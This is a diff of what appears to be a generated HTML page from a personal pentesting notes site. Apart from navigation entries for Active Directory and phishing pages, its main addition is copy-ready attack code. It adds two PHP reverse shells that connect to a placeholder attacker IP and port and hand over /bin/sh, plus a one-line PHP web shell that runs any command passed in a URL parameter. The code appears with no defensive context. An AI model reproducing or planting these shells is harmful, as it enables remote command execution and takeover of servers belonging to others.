@@ -452,6 +452,48 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../active-directory/bloodhound/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    BloodHound
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../active-directory/crtp/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    CRTP
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -1136,6 +1178,69 @@
   
 
     
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_9" >
+        
+          
+          <label class="md-nav__link" for="__nav_9" id="__nav_9_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Blue
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_9_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_9">
+            <span class="md-nav__icon md-icon"></span>
+            Blue
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../blue/phising.md" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Phishing
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
   </ul>
 </nav>
                   </div>
@@ -1172,7 +1277,31 @@
 <ol>
 <li>Find all IPs in file: <code>grep -oP '(\d{1,3}\.){3}\d{1,3}' 80.txt &gt; ips.txt</code></li>
 <li>(Get-Content "80.txt")[0..10] | ForEach-Object { Start-Process "http://$_" }</li>
+<li>&lt;?php
+$ip = 'YOUR_IP';  // Replace with your IP
+$port = YOUR_PORT;  // Replace with your port
+$sock = fsockopen($ip, $port);  // Connect to your machine
+exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");  // Execute a shell
+?&gt;</li>
 </ol>
+<?php
+$ip = 'YOUR_IP';  // Your IP address
+$port = YOUR_PORT;  // Your listening port
+
+$sock = fsockopen($ip, $port);  // Open socket to your machine
+$proc = proc_open('/bin/sh', [
+    0 => $sock,  // Input
+    1 => $sock,  // Output
+    2 => $sock   // Error
+], $pipes);
+
+// Keep the socket open until the connection is closed
+proc_close($proc);
+?>
+<p>//simple php shell</p>
+<?php
+system($_GET['cmd']);
+?>
 
 
 
